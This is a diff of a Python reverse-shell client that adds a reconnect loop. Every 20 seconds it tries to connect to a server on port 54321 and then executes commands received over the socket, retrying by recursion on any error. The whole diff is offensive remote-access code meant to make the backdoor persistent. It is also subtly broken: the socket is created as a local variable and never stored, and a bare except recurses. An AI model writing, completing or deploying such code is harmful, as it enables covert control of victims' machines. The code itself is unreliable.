@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import time
 
 
 class Reverse_Shell:
@@ -23,13 +24,19 @@ class Reverse_Shell:
             except ValueError:
                 continue
 
-    def connection(self):
+    def initialisation(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        # connection to the server
-        ipaddress = ""
-        sock.connect((ipaddress, 54321))
-        print("Connection established to the server")
+    def connection(self):
+        while True:
+            time.sleep(20)
+            try:
+                # connection to the server
+                ipaddress = ""
+                sock.connect((ipaddress, 54321))
+                self.execute_command()
+            except:
+                self.connection()
 
     def execute_command(self):
         while True:
@@ -56,7 +63,6 @@ class Reverse_Shell:
         sock.close()
 
     def main(self):
+        self.initialisation()
         self.connection()
-        self.execute_command()
-        if command == "q":
-            self.end_connection()
+        self.end_connection()
